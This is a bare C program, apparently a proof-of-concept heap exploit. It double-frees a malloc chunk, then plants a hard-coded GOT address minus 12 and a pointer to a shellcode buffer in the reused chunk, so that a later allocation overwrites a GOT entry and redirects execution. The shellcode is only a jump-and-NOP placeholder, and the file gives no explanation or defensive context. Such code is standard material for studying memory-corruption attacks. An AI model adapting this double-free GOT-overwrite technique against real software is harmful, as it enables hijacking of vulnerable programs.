#include <stdlib.h>
#include <string.h>
char * GOT_LOCATION = (char *)0x0804c98c;
char shellcode[] = "\xeb\x0cjump12chars_\x90\x90\x90\x90\x90\x90\x90\x90";

int main() {
    int size = sizeof(shellcode);
    void * shellcode_location;
    void * first, * second, * third, * fourth;
    void * fifth, * sixth, * seventh;
    shellcode_location = (void *)malloc(size);
    strcpy((char *)shellcode_location, shellcode);
    first = (void *)malloc(256);
    second = (void *)malloc(256);
    third = (void *)malloc(256);
    fourth = (void *)malloc(256);
    free(first);
    free(third);
    fifth = (void *)malloc(128);
    free(first);
    sixth = (void *)malloc(256);
    *((void **)(sixth+0)) = (void *)(GOT_LOCATION-12);
    *((void **)(sixth+4)) = (void *)shellcode_location;
    seventh = (void *)malloc(256);
    strcpy((char *)fifth, "something");
    return 0;
}
